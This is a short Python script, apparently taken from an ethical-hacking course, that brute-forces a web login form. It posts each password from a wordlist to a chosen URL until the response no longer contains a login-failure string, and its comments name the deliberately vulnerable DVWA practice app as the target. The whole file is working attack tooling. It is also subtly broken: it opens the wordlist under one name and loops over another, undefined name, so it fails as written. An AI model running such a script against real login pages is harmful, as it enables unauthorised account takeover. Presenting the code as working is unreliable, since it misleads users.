#script taken from Python For Ethical Hackers: Build Web App Login Brute-Force @ Udemy
#Docker:  docker run --rm -it -p 80:80 vulnerables/web-dvwa
#https://hub.docker.com/r/vulnerables/web-dvwa/
import requests

url = input('[+] Enter Page URL: ')
username = input('[+] Enter Username For The Account To Bruteforce: ')
password_file = input('[+] Enter Password File To Use: ')
login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')

def cracking (username, url) :
	for password in passwords:
		password = password.strip()
		print('Trying: ' + password)
		data = {'username': username, 'password': password, 'Login': 'submit'}
		response = requests.post(url, data=data)
		if login_failed_string in response.content.decode() :
			pass
		else:
			print('[+] Found Username: ==> ' + username)
			print('[+] Found Password: ==> ' + password)
			exit()

with open (password_file, 'r') as password:
	cracking (username, url)
print(' [!!] Password Not In List')
